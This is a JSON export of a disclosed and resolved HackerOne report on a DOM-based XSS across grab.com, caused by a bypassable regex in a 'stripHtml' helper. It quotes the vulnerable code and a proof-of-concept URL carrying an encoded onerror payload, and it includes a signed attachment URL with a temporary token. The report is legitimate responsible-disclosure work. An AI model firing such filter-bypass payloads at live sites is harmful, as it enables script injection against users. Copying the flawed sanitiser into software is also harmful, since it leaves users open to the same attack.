{"id":247246,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDcyNDY=","url":"https://hackerone.com/reports/247246","title":"Dom based xss affecting all pages from https://www.grab.com/.","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-07-08T17:18:20.693Z","submitted_at":"2017-07-08T17:18:20.693Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"netfuzzer","url":"/netfuzzer","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1659,"url":"https://hackerone.com/grab","handle":"grab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Grab","twitter_handle":"GrabSG","website":"https://grab.com","about":"Grab is Southeast Asia's #1 ride-hailing app, food delivery service and cashless payment solution."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-17T19:51:18.812Z","bug_reporter_agreed_on_going_public_at":"2017-07-18T19:51:12.006Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nthere's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.\nThis vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.\n\nVulnerable code:\n````\nvar stripHtml = (function () {\n\t\t  var div = document.createElement('div');\n\t\t  return function (html) {\n\t\t    div.innerHTML = html.replace(/\u003c\\/?\\w+[^\u003e]*\\/?\u003e/g, \"\");\n\t\t    return (div.innerText || div.textContent); // textContent is for firefox\n\t\t  };\n\t\t})();\n``````\n\nPoC: https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E\n\nvisit url above to reproduce.\n\nA screenshot is attached to this report.\n\ncheers,\nMario.","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003ethere\u0026#39;s a dom based xss vulnerability affecting all pages under the domain \u003ca title=\"https://www.grab.com/\" href=\"/redirect?url=https%3A%2F%2Fwww.grab.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.grab.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nThis vulnerability wasn\u0026#39;t properly patched so I managed to bypass the regular expressioned that was added into the function.\u003c/p\u003e\n\n\u003cp\u003eVulnerable code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar stripHtml = (function () {\n          var div = document.createElement(\u0026#39;div\u0026#39;);\n          return function (html) {\n            div.innerHTML = html.replace(/\u0026lt;\\/?\\w+[^\u0026gt;]*\\/?\u0026gt;/g, \u0026quot;\u0026quot;);\n            return (div.innerText || div.textContent); // textContent is for firefox\n          };\n        })();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePoC: \u003ca title=\"https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E\" href=\"/redirect?url=https%3A%2F%2Fwww.grab.com%2Fsg%2Fpartnerships%2F%3Fxss%3D%253C%253Ca%2F%253A%253C%2522a%2522%253Eimg%2520src%253D%2523%2520onerror%253Dconfirm%2528%2527XSSED%2527%2529%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003evisit url above to reproduce.\u003c/p\u003e\n\n\u003cp\u003eA screenshot is attached to this report.\u003c/p\u003e\n\n\u003cp\u003echeers,\u003cbr\u003e\nMario.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":201289,"file_name":"screenshot.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/289/f2536db6c8f531c414c6632e82cefab5fb3e192d/screenshot.png?response-content-disposition=attachment%3B%20filename%3D%22screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051054Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=ee5463c86bf412620cbf4f740709b034c7421edb9a29d8c175163ba7fb6fc3a6","file_size":739228,"type":"image/png"}],"allow_singular_disclosure_at":"2017-08-17T19:51:12.050Z","allow_singular_disclosure_after":-106219182.35992533,"singular_disclosure_allowed":true,"vote_count":11,"voters":["eveeez","lordjerry0x01","naategh","mr_r3boot","japz","sumit7","brdoors2","clarckowen_","asusrog","icheernoom","and 1 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1817068,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-08T17:18:57.456Z","updated_at":"2017-07-08T17:18:57.456Z","additional_data":{"old_title":"Dom based xss affects all pages from https://www.grab.com/.","new_title":"Dom based xss affecting all pages from https://www.grab.com/."},"actor":{"username":"netfuzzer","cleared":true,"url":"/netfuzzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1818935,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-10T06:05:11.682Z","updated_at":"2017-07-10T06:05:11.682Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":57079,"new_severity_id":57333},"actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1818936,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @netfuzzer \n\nWe have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.\n\nWe appreciate your help in keeping Grab and our customers safe and secure.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/netfuzzer\"\u003e@netfuzzer\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eWe have reviewed your bug report and would like to inform you that your submission is valid. We would request you give us some time while our teams are working on the fix. We will update you once the issue has been fixed so that you can verify the same.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your help in keeping Grab and our customers safe and secure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-10T06:05:35.460Z","updated_at":"2017-07-10T06:05:35.460Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1819902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"wow! that was fast! can no longer reproduce it.  it's fixed.","markdown_message":"\u003cp\u003ewow! that was fast! can no longer reproduce it.  it\u0026#39;s fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-10T13:08:06.870Z","updated_at":"2017-07-10T13:16:35.126Z","actor":{"username":"netfuzzer","cleared":true,"url":"/netfuzzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1823538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @netfuzzer ,\n\nIndeed, this vulnerability is fixed. Could you confirm that you found no way to bypass our fix ?\nThank you for working with us. Your bounty will be processed shortly.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/netfuzzer\"\u003e@netfuzzer\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eIndeed, this vulnerability is fixed. Could you confirm that you found no way to bypass our fix ?\u003cbr\u003e\nThank you for working with us. Your bounty will be processed shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-11T01:07:03.770Z","updated_at":"2017-07-11T01:07:03.770Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1823580,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, i can confirm there is no way to bypass this time.","markdown_message":"\u003cp\u003eYep, i can confirm there is no way to bypass this time.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-11T02:17:50.971Z","updated_at":"2017-07-11T02:17:50.971Z","actor":{"username":"netfuzzer","cleared":true,"url":"/netfuzzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1823700,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for working with us and helping us in resolving this issue. Your bounty will be processed shortly.","markdown_message":"\u003cp\u003eThank you for working with us and helping us in resolving this issue. Your bounty will be processed shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-11T04:41:45.909Z","updated_at":"2017-07-11T04:41:45.909Z","actor":{"username":"grabsecurity","cleared":false,"url":"/grabsecurity","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"netfuzzer","url":"/netfuzzer"},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1823701,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-11T04:42:14.228Z","updated_at":"2017-07-11T04:42:14.228Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (6.1)","old_severity_id":57333,"new_severity_id":57825},"actor":{"username":"grabsecurity","cleared":false,"url":"/grabsecurity","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1824533,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"this bug affected all pages under the domain www.grab.com. Do you really consider this \"medium\"?","markdown_message":"\u003cp\u003ethis bug affected all pages under the domain \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.grab.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.grab.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Do you really consider this \u0026quot;medium\u0026quot;?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-11T12:47:32.597Z","updated_at":"2017-07-11T12:47:32.597Z","actor":{"username":"netfuzzer","cleared":true,"url":"/netfuzzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1826834,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-11T23:59:44.079Z","updated_at":"2017-07-11T23:59:44.079Z","actor":{"url":"/grab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grab"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"grab","collaborator":{"username":"netfuzzer","url":"/netfuzzer"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1847884,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-18T19:51:12.023Z","updated_at":"2017-07-18T19:51:12.023Z","first_to_agree":true,"actor":{"username":"netfuzzer","cleared":true,"url":"/netfuzzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2i7X6Mc6Vz1cWzvXKPQNusxd/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1937337,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-17T19:51:18.848Z","updated_at":"2017-08-17T19:51:18.848Z","actor":{"url":"/grab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grab"}},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}